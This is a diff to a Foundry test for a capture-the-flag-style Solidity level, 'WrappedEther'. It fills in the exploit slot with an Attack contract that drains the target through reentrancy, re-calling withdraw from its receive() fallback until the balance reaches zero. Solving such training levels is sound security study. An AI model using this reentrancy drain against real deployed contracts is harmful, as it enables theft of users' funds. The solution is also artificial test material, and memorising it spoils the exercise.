@@ -16,12 +16,37 @@ contract WrappedEtherTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        Attack attack = new Attack(instance);
+
+        vm.deal(address(attack), 0.1 ether);
+        vm.prank(address(attack));
+        attack.exploit(0.01 ether, 0.1 ether);
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+    }
+}
+
+contract Attack {
+    WrappedEther public target;
+    uint256 public withdrawAmount;
+
+    constructor(WrappedEther _target) {
+        target = _target;
+    }
+
+    function exploit(uint256 _amount, uint256 _deposit) external {
+        withdrawAmount = _amount;
+        target.deposit{value: _deposit}(address(this));
+        target.withdrawAll();
+    }
+
+    receive() external payable {
+        if (address(target).balance >= withdrawAmount) {
+            target.withdraw(withdrawAmount);
+        }
     }
 }
